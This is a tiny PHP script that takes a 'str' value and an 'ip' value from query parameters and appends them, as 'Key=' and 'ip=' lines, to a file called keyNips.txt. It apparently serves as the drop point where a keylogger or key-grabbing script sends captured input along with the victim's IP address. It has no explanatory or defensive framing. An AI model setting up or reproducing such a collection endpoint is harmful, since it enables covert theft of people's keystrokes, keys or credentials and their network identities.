<?php
header('Content-Type: text/html;charset=UTF-8');
$d1=$_GET["str"];
$d2=$_GET["ip"];

file_put_contents('keyNips.txt', PHP_EOL, FILE_APPEND);
file_put_contents('keyNips.txt', PHP_EOL, FILE_APPEND);
file_put_contents('keyNips.txt', PHP_EOL, FILE_APPEND);

file_put_contents('keyNips.txt', "Key=" .$d1 .PHP_EOL, FILE_APPEND);

file_put_contents('keyNips.txt', "ip=" .$d2 .PHP_EOL, FILE_APPEND);


?>